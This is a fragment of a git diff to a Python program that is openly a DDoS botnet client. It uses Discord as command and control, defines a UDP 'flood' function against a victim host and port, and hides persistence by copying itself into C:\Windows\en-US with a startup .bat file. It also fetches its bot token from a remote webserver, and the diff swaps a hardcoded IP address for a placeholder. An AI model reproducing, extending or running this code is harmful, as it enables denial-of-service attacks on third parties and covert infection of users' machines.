@@ -7,11 +7,6 @@ import shutil#For the runatstartup() feature
 import sys#For the runatstartup() feature
 import discord#For the discord command and control
 from discord.ext import commands#For the discord command and control
-def errorhandlr(statement): #NOTE: This is a depreciated error handler I used for debugging the .pyw file. Remove or keep. 
-    logger = open('log.txt', "w+")
-    tempmes = 'here ' + str(statement)
-    logger.write(tempmes)
-    logger.close()
 def runatstartup():
     if os.name != 'nt': #don't attempt to auto run at startup if not windows
         return
@@ -59,7 +54,7 @@ def flood(victim, vport, duration):#The flooding protocol. Note that this has no
             pass
         clienta.sendto(bytes, (victim, vport))
 runatstartup()#Copy the running exe to C:\Windows\en-US and create a .bat file in Programs\Startup that will run the exe, this way the exe does not show up in the startup list.
-webserverip = '207.244.237.196'#change to your webserver IP only. No domain names etc
+webserverip = 'your.public.ipv4.ip'#change to your webserver IP only. No domain names etc
 token = requests.get('http://' + webserverip + '/token.html').text#Get the token from your webserver/token.html
 bot = commands.Bot(command_prefix='/')#Initialize the discord bot
 @bot.event  
